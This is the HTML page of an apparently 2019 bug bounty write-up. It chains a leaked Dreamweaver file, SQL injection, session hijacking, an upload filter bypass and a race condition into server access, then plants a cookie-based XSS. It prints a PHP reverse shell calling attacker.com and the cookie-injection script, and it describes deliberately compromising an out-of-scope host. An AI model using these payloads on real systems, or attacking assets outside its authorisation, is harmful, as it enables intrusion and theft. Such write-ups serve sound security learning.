<!DOCTYPE html>
<html lang="en">





<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="While doing Bug Bounty Hunting , I found a Cookie Based XSS Vulnerability on a website. Cookie Based XSS basically is a Self XSS. It will be very unfortunate...">
  <meta name="keywords" content="bug hunting, bug hunter, pentest, penetration testing, and hacking">
  <meta name="author" content="Exploiting Cookie Based XSS by Finding RCE | Noobe.io">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#f5f5f5">
  <meta name="google-site-verification" content="ovHMjnPbV77CCgMqbuScCfGjNhvMThbOFTHcHtuURHo" />

  <!-- Twitter Tags -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Exploiting Cookie Based XSS by Finding RCE | Noobe.io">
  <meta name="twitter:description" content="While doing Bug Bounty Hunting , I found a Cookie Based XSS Vulnerability on a website. Cookie Based XSS basically is a Self XSS. It will be very unfortunate...">
  
  <meta property="twitter:image" content="http://localhost:4000/img/df2e430d20474a0262177c6b7663106d-f.png">
  

  <!-- Open Graph Tags -->
  <meta property="og:type" content="blog">
  <meta property="og:url" content="http://localhost:4000/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce">
  <meta property="og:title" content="Exploiting Cookie Based XSS by Finding RCE | Noobe.io">
  <meta property="og:description" content="While doing Bug Bounty Hunting , I found a Cookie Based XSS Vulnerability on a website. Cookie Based XSS basically is a Self XSS. It will be very unfortunate...">
  
  <meta property="og:image" content="http://localhost:4000/img/df2e430d20474a0262177c6b7663106d-f.png">
  
  <title>Exploiting Cookie Based XSS by Finding RCE | Noobe.io</title>

  <!-- CSS files -->
  <link rel="stylesheet" href="http://localhost:4000/css/font-awesome.min.css">
  <link rel="stylesheet" href="http://localhost:4000/css/main.css">

  <link rel="canonical" href="http://localhost:4000/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce">
  <link rel="alternate" type="application/rss+xml" title="Noobe.io" href="http://localhost:4000/feed.xml" />

  <!-- Icons -->
  <!-- 16x16 -->
  <link rel="shortcut icon" href="http://localhost:4000/img/noobe-favicon.png">
  <!-- 32x32 -->
  <link rel="shortcut icon" href="http://localhost:4000/img/noobe-favicon.png">
  <link rel="stylesheet" type="text/css" href="http://localhost:4000/css/cookieconsent.min.css"/>
</head>


<body>
  <div class="row">
    <div class="col s12 m3">
      <div class="table cover">
        

<div class="cover-card table-cell table-middle">
  
  <a href="http://localhost:4000/">
    <img src="http://localhost:4000/img/noobe-logo.png" alt="" class="avatar">
  </a>
  
  <a href="http://localhost:4000/" class="author_name">noobe.io</a>
  <span class="author_job">Pentester • Bug Hunter • Security Enthusiast</span>
  <span class="author_bio mbm">Just another noob post.</span>
  <nav class="nav">
    <ul class="nav-list">
      <li class="nav-item">
        <a href="http://localhost:4000/">home</a>
      </li>
       
      <li class="nav-item">
        <a href="http://localhost:4000/archive/">Archive</a>
      </li>
        
      <li class="nav-item">
        <a href="http://localhost:4000/cookie-policy/">Cookie Policy</a>
      </li>
          
      <li class="nav-item">
        <a href="http://localhost:4000/categories/">Categories</a>
      </li>
            
      <li class="nav-item">
        <a href="http://localhost:4000/tags/">Tags</a>
      </li>
         
    </ul>
  </nav>
  <script type="text/javascript">
  // based on http://stackoverflow.com/a/10300743/280842
  function gen_mail_to_link(hs, subject) {
    var lhs,rhs;
    var p = hs.split('@');
    lhs = p[0];
    rhs = p[1];
    document.write("<a class=\"social-link-item\" target=\"_blank\" href=\"mailto");
    document.write(":" + lhs + "@");
    document.write(rhs + "?subject=" + subject + "\"><i class=\"fa fa-fw fa-envelope\"></i><\/a>");
  }
</script>
<div class="social-links">
  <ul>
    
      <li>
      <script>gen_mail_to_link('root@noobe.io', 'Hello from website');</script>
      </li>
    
    <li><a href="http://twitter.com/noobe_io" class="social-link-item" target="_blank"><i class="fa fa-fw fa-twitter"></i></a></li>
    
    
    <li><a href="http://linkedin.com/in/tomi-a-3b7a0a11b" class="social-link-item" target="_blank"><i class="fa fa-fw fa-linkedin"></i></a></li>
    
    
    
    
    <li><a href="http://github.com/noobeio" class="social-link-item" target="_blank"><i class="fa fa-fw fa-github"></i></a></li>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
  </ul>
</div>

</div>

      </div>
    </div>
    <div class="col s12 m9">
      <div class="post-listing">
        <a class="btn" href= "http://localhost:4000/" >
  Home
</a>

<div id="post">
  <header class="post-header">
    <h1 title="Exploiting Cookie Based XSS by Finding RCE">Exploiting Cookie Based XSS by Finding RCE</h1>
    <span class="post-meta">
      <span class="post-date">
        22 SEP 2019
      </span>
      •
      <span class="read-time" title="Estimated read time">
  
  
    8 mins read
  
</span>

    </span>

  </header>

  <article class="post-content">
    <p>بسم الله الرحمن الرحيم</p>

<blockquote>
  <p>When doing penetrating on this target, I collaborated with <a href="https://medium.com/@YoKoKho?source=post_page-----9a4065368ba3----------------------">YoKo Kho</a> to get the highest privileges. In this paper you may find a little similarity with <a href="https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3">his trick</a>. But in the real case, what we write is a different feature. If you have read his writing, this story is the prequel of it.</p>
</blockquote>

<p>While doing Bug Bounty Hunting , I found a <strong>Cookie Based XSS Vulnerability</strong> on a website. Cookie Based XSS basically is a Self XSS. It will be very unfortunate if the findings were reported and only got Very Low Severity which for the severity there was no Bounty or Points given.</p>

<p>The scope of this program is very limited, but the target domain has lots of subdomains. The first thing that comes to mind is looking for XSS Vulnerabilities in target subdomains that are <strong>out of scope</strong> to trigger Cookie Based XSS in <strong>in-scope</strong> target domains, so by that severity will increase at least to High or Medium.</p>

<h4 id="i-information-disclosure">I. Information Disclosure</h4>

<p>After hunting for some time, no subdomains that have XSS vulnerabilities were found either. Until when doing a <em>bruteforce</em> directory on one of the subdomains, I found an interesting file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/redacted/redacted/_notes/dwsync.xml
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">dwsync.xml</code> file is a file generated by Dreamweaver. Where the file contains information related to what files are in the website directory.</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-1.png" alt="Figure 1 — dwsync.xml File" /></p>

<h4 id="ii-sql-injection">II. SQL Injection</h4>

<p>By default, to access the website requires credentials, and we cannot create an account on the website. As explained above, through the <code class="language-plaintext highlighter-rouge">dwsync.xml</code> file, we can get information related to what files are on the target website. So I tried to access one of the files, for example I tried to access the <code class="language-plaintext highlighter-rouge">redacted.php</code> file.</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-2.png" alt="Figure 2 — redacted.php File" /></p>

<p>We can see an error message appears: <code class="language-plaintext highlighter-rouge">Undefined index: ver</code>, which means on that page there is a variable <code class="language-plaintext highlighter-rouge">ver</code> that has not been defined. For that, I also changed the URL to something like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/dir/redacted.php?ver=1
</code></pre></div></div>

<p>And the page display changes, but only displays the number <code class="language-plaintext highlighter-rouge">1</code>.</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-3.png" alt="Figure 3 — redacted.php with ver variable" /></p>

<p>Don’t know what the meaning of number 1 is, that number is also not a reflection of the value I entered in the <code class="language-plaintext highlighter-rouge">ver</code> parameter above. But seeing the parameter in the URL, my hand felt <em>itchy</em> to add the symbol <code class="language-plaintext highlighter-rouge">‘</code> to that parameter. And the result …</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-4.png" alt="Figure 4 — SQL Error Message" /></p>

<p>It looks like the error message looks very familiar. Without waiting long, I immediately tried to do <code class="language-plaintext highlighter-rouge">SQL Injection</code> with <code class="language-plaintext highlighter-rouge">SQLmap</code>. And here is the list of databases obtained:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] redacted_db
[*] tmp
</code></pre></div></div>

<h4 id="iii-authentication-bypass">III. Authentication Bypass</h4>

<p>From the <code class="language-plaintext highlighter-rouge">SQL Injection</code> vulnerability, I tried to upload shell to the target server, but it’s failed. So I must be able to login to the website using the data in the database.</p>

<p>After trying to extract the <code class="language-plaintext highlighter-rouge">redacted_db</code> database, a table named <code class="language-plaintext highlighter-rouge">user_tbl</code> was found. In the table there is information related to the user on the target website. But unfortunately, the user’s password is hashed using <code class="language-plaintext highlighter-rouge">md5</code> and when trying to crack, nothing works.</p>

<p>Not giving up until then, I went back to look for tables that might be used. So I arrived at a table called <code class="language-plaintext highlighter-rouge">session_tbl</code>. In the table, there are only 3 columns, <code class="language-plaintext highlighter-rouge">session_id</code>, <code class="language-plaintext highlighter-rouge">user_id</code>, and <code class="language-plaintext highlighter-rouge">session</code>.</p>

<p>From there I realized that the table contained active sessions from the website user. So I searched for the user with the highest role level in the <code class="language-plaintext highlighter-rouge">user_tbl</code> table, and searched for the session in the session table. Then I tried to enter the session value obtained from the database into the <code class="language-plaintext highlighter-rouge">Cookie</code> website with the session name. And finally I successfully login to the website.</p>

<h4 id="iv-unrestricted-file-upload">IV. Unrestricted File Upload</h4>

<p>Long story short, after being able to log into the target website, then I look for other vulnerabilities that can be exploited. On the website there is a feature for uploading files. Of course this is a feature that we must test.</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-5.png" alt="Figure 5 — File Upload Form" /></p>

<p>I also tried to upload a file with the <code class="language-plaintext highlighter-rouge">.phtml</code> extension, but the file was rejected and could not be uploaded.</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-6.png" alt="Figure 6 — File Rejected" /></p>

<p>But I suspect, the filter only runs on the client side. This means that there is potential for bypasses with the help of tools such as Burpsuite. So I tried uploading the file again, this time with the .jpg extension then in Burpsuite Intercept, I change the extension to <code class="language-plaintext highlighter-rouge">.phtml</code>.</p>

<p>Here’s the screenshot when I re-upload the file using Repeater.</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-7.png" alt="Figure 7 — File Uploaded" /></p>

<p>After using the method above, the file was successfully uploaded. Seeing the response that appears, the file is stored in <code class="language-plaintext highlighter-rouge">AWS</code>, not on the target website</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://storage-redacted.s3-ap-southeast-1.amazonaws.com/redacted_dir/redacted_file.phtml
</code></pre></div></div>

<h4 id="v-remote-code-execution">V. Remote Code Execution</h4>

<p>Seeing the uploaded file stored in <code class="language-plaintext highlighter-rouge">AWS</code>, not much can be done on that file, because our target is the web server not the <code class="language-plaintext highlighter-rouge">AWS</code> server. So I also tried to understand the response displayed by the target server.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/html/redacted/../redacted****/var/www/html/redacted/../redacted/info.phtml&lt;br&gt;Uploading part 2 of /var/www/html/redacted/../redacted/info.phtml.
Uploaded /var/www/html/redacted/../redacted/info.phtml to https://storage-redacted.s3-ap-southeast-1.amazonaws.com/redacted_dir/redacted_file.phtml.
SUCCESS 52673, 98235
</code></pre></div></div>

<p>From the response above, I assume that besides being stored on AWS, there is a possibility that uploaded files will be stored on the target website in the <strong>redacted</strong> directory. So I also tried to visit the following URL:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/redacted/redacted/info.phtml
</code></pre></div></div>

<p>And the file was not found.</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-8.png" alt="Figure 8 — File Not Found" /></p>

<p>But I still assume, it isn’t make sense if the response displays a <strong>redacted</strong> directory if it has nothing to do with the file that we uploaded. What if what happens is, the file that we upload is temporarily stored in the <strong>redacted</strong> directory, then after some time it is thrown into <code class="language-plaintext highlighter-rouge">AWS</code> as a storage place.</p>

<p>If my assumption is correct, then our file will be on the server for a second before uploading to <code class="language-plaintext highlighter-rouge">AWS</code>. And we must catch the file before sending it to <code class="language-plaintext highlighter-rouge">AWS</code> server.</p>

<p>To test it, I use <em>Burpsuite Intruder</em> and try to do a <code class="language-plaintext highlighter-rouge">GET</code> Request continuously to the URL file in the <strong>redacted</strong> directory.</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-9.png" alt="Figure 9 — File Found" /></p>

<p>And sure enough, for some time the file was on the target server <em>(HTTP Code 200)</em>, and not long after that file disappeared <em>(HTTP Code 404)</em> indicating the file has been moved to <code class="language-plaintext highlighter-rouge">AWS</code>.</p>

<p>So by doing the same thing, we can upload <em>PHP Reverse Shell</em> to get the shell from the target website.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/attacker.com/1337 0&gt;&amp;1'"</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-10.png" alt="Figure 10 — Pwned" /></p>

<p>And finally I also got access to the target server.</p>

<h4 id="vi-the-xss">VI. The XSS</h4>

<p>Back to first of story, after getting shell access, I placed an <code class="language-plaintext highlighter-rouge">HTML</code> file containing javascript to trigger <code class="language-plaintext highlighter-rouge">XSS</code> on websites that were in the bounty scope.</p>

<p>With HTML code like the this:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">evil=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E@;path=/;domain=.redacted.com;</span><span class="dl">"</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>We can create a cookie named <strong>evil</strong> on the <code class="language-plaintext highlighter-rouge">redacted.com</code> domain with the value containing the XSS Payload <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert(1)&gt;</code>. So when you access the in-scope bounty domain, the cookie will be loaded and XSS will be triggered.</p>

<p><img src="/assets/df2e430d20474a0262177c6b7663106d-11.gif" alt="Figure 11 — Pwned" /></p>

<p>Getting full server access on an <strong>out of scope</strong> website to trigger XSS on an <strong>in-scope</strong> website is rather ironic indeed. But that’s Bug Hunting, as much as possible we must be able to convince the Program Owner that the vulnerability we find can be exploited and have a significant impact.</p>

<p>On that website I found a several Cookie Based XSS worth $5000.</p>

<h4 id="vii-conclusion">VII. Conclusion</h4>

<p>Here’s some noob tips that you can do when doing Bug Hunting:</p>

<ul>
  <li>When finding vulnerability with a low severity, don’t report it immediately. Look for possibilities that can be used to increase the severity.</li>
  <li>If you find a website with a login page without a registration feature, try to <strong>bruteforce</strong> it using <em>dirsearch</em>, <em>dirbuster</em>, etc. Websites that only display a login page and no registration feature indicate that the website can only be accessed by an internal team, and usually such websites have lots of bugs.</li>
  <li>If you find <strong>SQL Injection</strong> and a password is hashed on the database, try to visit another table, there might be something juicy there.</li>
  <li>If you find the upload form and you cannot upload the shell. Try to bypass it by trying to upload via Burpsuite Repeater, changing extensions, mime type, etc. After the file has been uploaded successfully, learn the flow how they save the file.</li>
</ul>

  </article>
</div>

<div class="share-buttons">
  <h6>Share on: </h6>
  <ul>
    <li>
      <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce" class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
    </li>
    <li>
      <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
    </li>
    <li>
      <a href="https://plus.google.com/share?url=http://localhost:4000/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
    </li>
    <li>
      <a href="https://news.ycombinator.com/submitlink?u=http://localhost:4000/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
    </li>
    <li>
      <a href="https://www.reddit.com/submit?url=http://localhost:4000/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
    </li>
  </ul>
</div><!-- end share-buttons -->


<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://noobe.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<script id="dsq-count-scr" src="//noobe.disqus.com/count.js" async></script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>



        <footer>
  &copy; 2020 Noobe.io. Powered by <a href="http://jekyllrb.com/">Jekyll</a>, <a href="http://github.com/renyuanz/leonids/">leonids theme</a> made with <i class="fa fa-heart heart-icon"></i>
</footer>

      </div>
    </div>
  </div>
  <script type="text/javascript" src="http://localhost:4000/js/jquery-3.2.1.min.js"></script>
<script type="text/javascript" src="http://localhost:4000/js/main.js"></script>
<script src="http://localhost:4000/js/cookieconsent.min.js"></script>
<script>
      window.addEventListener("load", function(){window.wpcc.init({"border":"thin","corners":"small","colors":{"popup":{"background":"#f0edff","text":"#000000","border":"#5e65c2"},"button":{"background":"#5e65c2","text":"#ffffff"}},"position":"bottom","fontsize":"small","content":{"href":"http://noobe.io/cookie-policy/"}})});
</script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-156423500-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-156423500-1');
</script>



</body>
</html>
